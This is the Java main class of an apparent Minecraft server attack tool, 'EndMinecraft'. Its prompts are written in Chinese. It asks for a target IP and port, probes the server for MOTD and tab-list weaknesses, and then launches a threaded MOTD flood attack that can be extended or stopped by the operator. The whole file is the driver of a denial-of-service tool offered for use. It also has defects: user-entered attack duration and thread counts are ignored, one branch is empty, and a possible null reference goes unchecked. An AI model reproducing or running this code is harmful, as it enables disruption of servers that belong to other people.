package me.alikomi.endminecraft;

import me.alikomi.endminecraft.data.BugData;
import me.alikomi.endminecraft.data.InfoData;
import me.alikomi.endminecraft.tasks.attack.MotdAttack;
import me.alikomi.endminecraft.tasks.scan.ScanBug;
import me.alikomi.endminecraft.tasks.scan.ScanInfo;
import me.alikomi.endminecraft.utils.Util;

import java.util.Scanner;

public class Main extends Util {

    public static BugData bugData;
    public static InfoData infoData;

    public static String ip;
    public static int port = 25565;

    public static void main(String[] args) throws InterruptedException {
        Scanner sc = new Scanner(System.in);
        log("请输入ip地址");
        ip = sc.next();
        if (ip.contains(":")) {
            String[] tmpip = ip.split(":");
            ip = tmpip[0];
            port = Integer.parseInt(tmpip[1]);
        }else {
            log("请输入端口（输入错误则为25565）");
            port = sc.nextInt();
        }
        infoData = new InfoData(ip, port);

        log("正在探测服务器信息，请稍后");
        ScanInfo.ScanMotdInfo(ip,port);
        log("是否开始进服前漏洞探测y/n");
        if ("y".equalsIgnoreCase(sc.next())) {
            bugData = new BugData(ip, port);
            ScanBug.scanMOTD(ip, port);
            ScanBug.scanTAB(ip,port);
            log("漏洞检测结果： ");
            log(bugData.toString());
        }

        log("是否开始执行自动攻击y/n");

        if ("y".equalsIgnoreCase(sc.next())) {
            if (bugData.getMotdBug()) {
                log("服务器为BC，且支持MOTD攻击，正在尝试MOTD攻击");
                new Thread(() -> {

                    MotdAttack attack = new MotdAttack(ip,port,50000,10);
                    log("即将发送MOTD攻击，攻击时间50秒，攻击线程10");
                    if (attack.startAttack()) log("攻击发送成功");
                    else log("攻击发送失败");

                }).start();
                Thread.sleep(51000);
                log("请选择是否继续MOTD攻击 y/n");
                if ("y".equalsIgnoreCase(sc.next())) {
                    log("请输入攻击时间(ms) ，1蛤=1000ms");//我就是这么暴力
                    int time = sc.nextInt();
                    int thread = sc.nextInt();
                    MotdAttack attack = new MotdAttack(ip,port,50000,10);
                    attack.startAttack();
                    log("攻击已经开始，终止请输入stop");
                    if ("stop".equalsIgnoreCase(sc.next())) {
                        attack.stopAttack();
                    }
                }
            }

            if (infoData.getServerVersion().contains("Bungee")) {

            }
        }

    }

}
